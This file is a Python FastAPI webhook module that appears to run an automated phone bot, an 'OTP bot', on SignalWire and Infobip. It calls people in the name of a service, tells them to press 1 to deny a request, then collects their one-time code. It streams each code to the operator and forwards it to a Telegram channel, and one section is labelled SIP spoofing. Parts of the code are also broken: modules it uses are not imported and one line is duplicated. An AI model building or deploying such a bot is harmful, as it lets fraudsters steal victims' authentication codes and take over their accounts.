from fastapi import APIRouter, Request, Form, HTTPException
from fastapi.responses import Response
from services.mongodb_service import MongoDBService
from services.signalwire_service import SignalWireService
from services.telegram_service import TelegramService
from services.websocket_manager import manager
from datetime import datetime
import logging

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/webhooks", tags=["Webhooks"])

signalwire = SignalWireService()
telegram = TelegramService()

# Import active_calls from calls route (in production use shared storage)
from routes.calls import active_calls

@router.post("/signalwire/{call_id}")
async def signalwire_webhook(call_id: str, request: Request):
    """Handle SignalWire call webhooks"""
    try:
        form_data = await request.form()
        call_status = form_data.get('CallStatus')
        
        logger.info(f"SignalWire webhook for call {call_id}: {call_status}")
        
        # Get call from MongoDB
        call_data = await MongoDBService.get_call(call_id)
        
        if not call_data:
            logger.warning(f"Call {call_id} not found in MongoDB")
            return Response(content="OK", media_type="text/plain")
        
        # Create event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': call_status.lower(),
            'data': dict(form_data)
        }
        
        # Update MongoDB - add event and update status
        await MongoDBService.update_call_events(call_id, event)
        await MongoDBService.update_call_status(call_id, call_status.lower())
        
        # Send to user via WebSocket
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # Generate TwiML using EXACT text from UI form
        voice = call_data.get('tts_voice', 'Aurora')
        
        # Get messages - EXACT text from UI form (NO hardcoded text)
        step_1_message = call_data.get('step_1_message', 'Hello')
        
        # Main webhook - Play Step 1 ONLY (EXACT text from UI)
        # No additional hardcoded prompts
        first_input_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/first-input"
        
        twiml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="1" action="{first_input_url}" method="POST" timeout="10">
        <Say voice="{voice}">{step_1_message}</Say>
    </Gather>
    <Say voice="{voice}">We did not receive any input. Goodbye.</Say>
    <Hangup/>
</Response>"""
        
        return Response(content=twiml, media_type="application/xml")
    
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return Response(content="Error", media_type="text/plain")

@router.post("/signalwire/{call_id}/first-input")
async def signalwire_first_input(call_id: str, request: Request, Digits: str = Form(None)):
    """Handle first digit input (1 or 0)"""
    try:
        logger.info(f"First input for call {call_id}: {Digits}")
        
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        call_data = call_doc.to_dict()
        voice = call_data.get('tts_voice', 'Aurora')
        
        # Create event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'first_input_received',
            'data': {'digit': Digits}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        if Digits == '1':
            # User pressed 1 (deny/block) - Redirect to gather OTP
            deny_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/deny"
            twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{deny_url}</Redirect></Response>'
            return Response(content=twiml, media_type="application/xml")
            
        elif Digits == '0':
            # User pressed 0 (accept) - Play accepted message
            accept_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/accept"
            twiml = f'<?xml version="1.0" encoding="UTF-8"?><Response><Redirect>{accept_url}</Redirect></Response>'
            return Response(content=twiml, media_type="application/xml")
        else:
            # Invalid input
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice}">Invalid input. Please try again.</Say>
    <Redirect>https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}</Redirect>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
    except Exception as e:
        logger.error(f"First input error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error processing input</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/deny")
async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(None)):
    """Handle deny flow - User pressed 1 - Gather OTP"""
    try:
        logger.info(f"Deny flow for call {call_id}, Digits: {Digits}")
        
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        call_data = call_doc.to_dict()
        voice = call_data.get('tts_voice', 'Aurora')
        digits_required = call_data.get('digits', 6)
        
        # If OTP digits received
        if Digits and len(Digits) == digits_required:
            # Log OTP received
            event = {
                'time': datetime.utcnow().isoformat(),
                'event': 'otp_received',
                'data': {'otp': Digits}
            }
            
            await MongoDBService.update_call_events(call_id, event)
            call_ref.update({'status': 'otp_entered'})
            
            await manager.send_to_user(call_data['user_id'], {
                'type': 'call_event',
                'call_id': call_id,
                'event': event
            })
            
            # Forward OTP to Telegram (optional)
            try:
                user = await MongoDBService.get_user(call_data['user_id'])
                await telegram.send_otp_to_channel(
                    otp_code=Digits,
                    call_id=call_id,
                    user_email=user.get('email', 'Unknown')
                )
            except Exception as e:
                logger.warning(f"Failed to forward OTP to Telegram: {e}")
            
            # Play Step 3 + Rejected message (EXACT text from UI)
            step_3_message = call_data.get('step_3_message', 'Please wait')
            rejected_message = call_data.get('rejected_message', 'Thank you')
            
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice}">{step_3_message}</Say>
    <Pause length="2"/>
    <Say voice="{voice}">{rejected_message}</Say>
    <Hangup/>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
        else:
            # First time - Ask for OTP using Step 2 message (EXACT text from UI)
            step_2_message = call_data.get('step_2_message', 'Please enter your code')
            
            gather_url = f"https://callbot-research.preview.emergentagent.com/api/webhooks/signalwire/{call_id}/deny"
            
            twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="{digits_required}" action="{gather_url}" method="POST" timeout="15">
        <Say voice="{voice}">{step_2_message}</Say>
    </Gather>
    <Say voice="{voice}">We did not receive the code. Goodbye.</Say>
    <Hangup/>
</Response>'''
            return Response(content=twiml, media_type="application/xml")
            
    except Exception as e:
        logger.error(f"Deny flow error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/accept")
async def signalwire_accept(call_id: str, request: Request):
    """Handle accept flow - User pressed 0"""
    try:
        logger.info(f"Accept flow for call {call_id}")
        
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            return Response(
                content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Call not found</Say><Hangup/></Response>',
                media_type="application/xml"
            )
        
        call_data = call_doc.to_dict()
        voice = call_data.get('tts_voice', 'Aurora')
        
        # Log accepted
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'call_accepted',
            'data': {}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        call_ref.update({'status': 'accepted'})
        
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # Play Accepted message (EXACT text from UI)
        accepted_message = call_data.get('accepted_message', 'Thank you for confirming')
        
        twiml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice}">{accepted_message}</Say>
    <Hangup/>
</Response>'''
        return Response(content=twiml, media_type="application/xml")
        
    except Exception as e:
        logger.error(f"Accept flow error: {e}")
        return Response(
            content='<?xml version="1.0" encoding="UTF-8"?><Response><Say>Error</Say><Hangup/></Response>',
            media_type="application/xml"
        )

@router.post("/signalwire/{call_id}/gather")
async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(None)):
    """Handle DTMF digit gathering"""
    try:
        logger.info(f"Gathered digits for call {call_id}: {Digits}")
        
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            return Response(
                content=signalwire.generate_twiml_response("Call not found"),
                media_type="application/xml"
            )
        
        call_data = call_doc.to_dict()
        
        # Create event for digits received
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': 'digits_received',
            'data': {'digits': Digits}
        }
        
        await MongoDBService.update_call_events(call_id, event)
        
        # Update status to 'digit_entered'
        call_ref.update({'status': 'digit_entered'})
        
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        # Forward OTP to Telegram (optional, don't block on error)
        if Digits:
            try:
                user = await MongoDBService.get_user(call_data['user_id'])
                await telegram.send_otp_to_channel(
                    otp_code=Digits,
                    call_id=call_id,
                    user_email=user.get('email', 'Unknown')
                )
            except Exception as e:
                logger.warning(f"Failed to forward OTP to Telegram: {e}")
        
        # Play step 3 message (waiting)
        return Response(
            content=signalwire.generate_twiml_response(
                message=call_data.get('step_3_message', 'Please wait'),
                voice=call_data['tts_voice'],
                hangup=False
            ),
            media_type="application/xml"
        )
    
    except Exception as e:
        logger.error(f"Gather webhook error: {e}")
        return Response(
            content=signalwire.generate_twiml_response("Error processing request"),
            media_type="application/xml"
        )

@router.get("/external/call/{call_id}")
async def get_call_data_for_webhook(call_id: str):
    """Get call data for external PHP webhook (public endpoint)"""
    try:
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            raise HTTPException(status_code=404, detail="Call not found")
        
        call_data = call_doc.to_dict()
        
        # Return EXACT messages from UI form for PHP webhook TwiML generation
        return {
            "call_id": call_id,
            "from_number": call_data.get('from_number'),
            "to_number": call_data.get('to_number'),
            "recipient_name": call_data.get('recipient_name'),
            "service_name": call_data.get('service_name'),
            "tts_voice": call_data.get('tts_voice', 'Aurora'),
            "language": call_data.get('language', 'en-US'),
            "digits": call_data.get('digits', 6),
            "step_1_message": call_data.get('step_1_message', ''),
            "step_2_message": call_data.get('step_2_message', ''),
            "step_3_message": call_data.get('step_3_message', ''),
            "accepted_message": call_data.get('accepted_message', ''),
            "rejected_message": call_data.get('rejected_message', ''),
            "external_webhook_base": "https://piddly-tenable-frederic.ngrok-free.dev"
        }
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error getting call data: {e}")
        raise HTTPException(status_code=500, detail="Failed to get call data")

@router.post("/external/update/{call_id}")
async def external_webhook_update(call_id: str, request: Request):
    """Receive updates from external PHP webhook"""
    try:
        data = await request.json()
        
        logger.info(f"External webhook update for call {call_id}: {data}")
        
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            return {"status": "error", "message": "Call not found"}
        
        call_data = call_doc.to_dict()
        
        # Update status if provided
        if 'status' in data:
            call_ref.update({'status': data['status']})
        
        # Add event
        event = {
            'time': datetime.utcnow().isoformat(),
            'event': data.get('event', 'external_update'),
            'data': data
        }
        
        await MongoDBService.update_call_events(call_id, event)
        
        # Send to user via WebSocket
        await manager.send_to_user(call_data['user_id'], {
            'type': 'call_event',
            'call_id': call_id,
            'event': event
        })
        
        return {"status": "success", "call_id": call_id}
        
    except Exception as e:
        logger.error(f"External webhook error: {e}")
        return {"status": "error", "message": str(e)}

@router.post("/signalwire/{call_id}/status")
async def signalwire_status(call_id: str, request: Request):
    """Handle SignalWire call status updates"""
    try:
        form_data = await request.form()
        call_status = form_data.get('CallStatus')
        recording_url = form_data.get('RecordingUrl')
        
        logger.info(f"Status update for call {call_id}: {call_status}")
        
        # Get call from Firestore
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if call_doc.exists:
            call_data = call_doc.to_dict()
            
            event = {
                'time': datetime.utcnow().isoformat(),
                'event': f'status_{call_status}',
                'data': {'status': call_status, 'recording_url': recording_url}
            }
            
            await MongoDBService.update_call_events(call_id, event)
            
            # Update call status and recording URL in Firestore
            update_data = {'status': call_status.lower()}
            if recording_url:
                update_data['recording_url'] = recording_url
            
            call_ref.update(update_data)
            
            await manager.send_to_user(call_data['user_id'], {
                'type': 'call_event',
                'call_id': call_id,
                'event': event
            })
            
            # If call completed, remove from active calls
            if call_status in ['completed', 'failed', 'busy', 'no-answer']:
                active_calls.pop(call_id, None)
        
        return Response(content="OK", media_type="text/plain")
    
    except Exception as e:
        logger.error(f"Status webhook error: {e}")


# =====================================================
# INFOBIP WEBHOOKS (Regular + SIP Spoofing)
# =====================================================

@router.post("/infobip/{call_id}")
async def infobip_webhook(call_id: str, request: Request):
    """Main webhook for Infobip calls - Step 1"""
    try:
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        call_doc = call_ref.get()
        
        if not call_doc.exists:
            return Response(content='{"say":[{"text":"Call not found"}],"hangup":{}}', media_type="application/json")
        
        call_data = call_doc.to_dict()
        voice = call_data.get('tts_voice', 'Aurora')
        language = call_data.get('language', 'en-US')
        step_1_message = call_data.get('step_1_message', 'Hello')
        
        voice_map = {'Aurora': 'Joanna', 'Chirp': 'Matthew', 'woman': 'Joanna', 'man': 'Matthew'}
        infobip_voice = voice_map.get(voice, 'Joanna')
        
        backend_url = os.getenv('BACKEND_URL', 'https://callbot-analytics.preview.emergentagent.com')
        first_input_url = f"{backend_url}/api/webhooks/infobip/{call_id}/first-input"
        
        response_json = {
            "say": [{"text": step_1_message, "language": language, "voice": infobip_voice}],
            "capture": {"maxLength": 1, "timeout": 10000, "actionUrl": first_input_url}
        }
        
        logger.info(f"Infobip webhook {call_id}: Step 1")
        return Response(content=json.dumps(response_json), media_type="application/json")
    except Exception as e:
        logger.error(f"Infobip webhook error: {e}")
        return Response(content='{"say":[{"text":"Error"}],"hangup":{}}', media_type="application/json")

@router.post("/infobip/{call_id}/first-input")
async def infobip_first_input(call_id: str, request: Request):
    """Handle first digit (1 or 0)"""
    try:
        body = await request.json()
        digits = body.get('dtmf', {}).get('digits', '')
        
        from config.firebase_init import db
        backend_url = os.getenv('BACKEND_URL', 'https://callbot-analytics.preview.emergentagent.com')
        
        if digits == '1':
            deny_url = f"{backend_url}/api/webhooks/infobip/{call_id}/deny"
            return Response(content=json.dumps({"goto": deny_url}), media_type="application/json")
        elif digits == '0':
            accept_url = f"{backend_url}/api/webhooks/infobip/{call_id}/accept"
            return Response(content=json.dumps({"goto": accept_url}), media_type="application/json")
        else:
            return Response(content='{"say":[{"text":"Invalid input"}],"hangup":{}}', media_type="application/json")
    except Exception as e:
        logger.error(f"Infobip first-input error: {e}")
        return Response(content='{"say":[{"text":"Error"}],"hangup":{}}', media_type="application/json")

@router.post("/infobip/{call_id}/status")
async def infobip_status_webhook(call_id: str, request: Request):
    """Infobip status callback"""
    try:
        body = await request.json()
        status = body.get('status', '')
        
        from config.firebase_init import db
        call_ref = db.collection('calls').document(call_id)
        if call_ref.get().exists:
            call_ref.update({'status': status.lower()})
            logger.info(f"Infobip call {call_id} status: {status}")
        
        return Response(content="OK", media_type="text/plain")
    except Exception as e:
        logger.error(f"Infobip status error: {e}")
        return Response(content="Error", media_type="text/plain")

        return Response(content="Error", media_type="text/plain")